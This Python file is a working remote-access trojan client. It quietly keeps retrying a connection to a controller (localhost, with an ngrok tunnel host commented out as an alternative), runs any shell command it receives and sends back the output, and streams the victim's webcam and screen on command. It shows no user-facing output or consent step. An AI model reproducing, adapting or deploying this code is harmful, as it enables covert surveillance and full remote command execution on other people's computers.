import socket , cv2 , pickle , struct , sys , time , os , subprocess , numpy as np , pyautogui
from threading import Thread

global connected, cam_access_flag, scrn_access_flag , client_conn_obj
connected, cam_access_flag, scrn_access_flag = 0, 0, 0


def give_cam_access():
    global cam_access_flag, cap
    cap = cv2.VideoCapture(0)
    while cam_access_flag:
        success, frame = cap.read()
        if success:
            frame = cv2.resize(frame, (90, 90))
            if client_conn_obj:
                a = pickle.dumps(frame)
                msg = struct.pack('Q', len(a))+a
                client_conn_obj.sendall(msg)
                
    else:
        cap.release()
        # print('Camera aborted')


def give_cmd_access(cmd):
    # print('cmd granted')
    output = subprocess.getoutput(cmd)
    # print('executed')
    if len(output) == 0:
        output = "Command executed successfully"
    client_conn_obj.send(str.encode(output))
    # print('sent output : ', output, len(output))


def give_scrn_access():
    global scrn_access_flag
    while scrn_access_flag:
        # print('sending screen')
        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        size, threshold = frame.shape, 50
        h, w = int(size[1]-(size[1]*(threshold/100))
                   ), int(size[0]-(size[0]*(threshold/100)))
        frame = cv2.resize(frame, (h, w))
        if True:
            if client_conn_obj:
                a = pickle.dumps(frame)
                msg = struct.pack('Q', len(a))+a
                client_conn_obj.sendall(msg)
    else:
        pass
        # print('Screen aborted')


def execute_cmd():
    global cam_access_flag, connected , scrn_access_flag
    while True:
        if connected:
            cmd = client_conn_obj.recv(1024).decode('utf8')
            if len(cmd) > 0 and 'cam_cmd ' in cmd:
                # print(cmd, cam_access_flag)
                cmd = cmd[8:]
                if cmd == "give camera access" and cam_access_flag != 1:
                    cam_access_flag = 1
                    cam_th = Thread(target=give_cam_access)
                    cam_th.start()
                if cmd == "abort camera access" and cam_access_flag != 0:
                    cam_access_flag = 0
                    cap.release()

            elif 'internal_cmd ' in cmd:
                cmd = cmd[13:]
                give_cmd_access(cmd)

            elif 'scrn_cmd ' in cmd:
                cmd = cmd[9:]
                print('cmd : ', cmd)
                if cmd == "give screen access":
                    scrn_access_flag = 1
                    scrn_th = Thread(target=give_scrn_access)
                    scrn_th.start()
                if cmd == "abort screen access":
                    scrn_access_flag = 0

def connect_to_server():
    global connected , client_conn_obj
    while not connected:
        try:
            client_conn_obj.connect((host, port))
            # print('connected...to the host : ', socket.gethostname())
            connected = 1
        except:
            pass

host, port = 'localhost', 9999
# host , port = '0.tcp.in.ngrok.io' , 12832
client_conn_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# print('Waiting for server....')


connect_server = Thread(target=connect_to_server)
connect_server.start()

execute_cmd_th = Thread(target=execute_cmd)
execute_cmd_th.start()
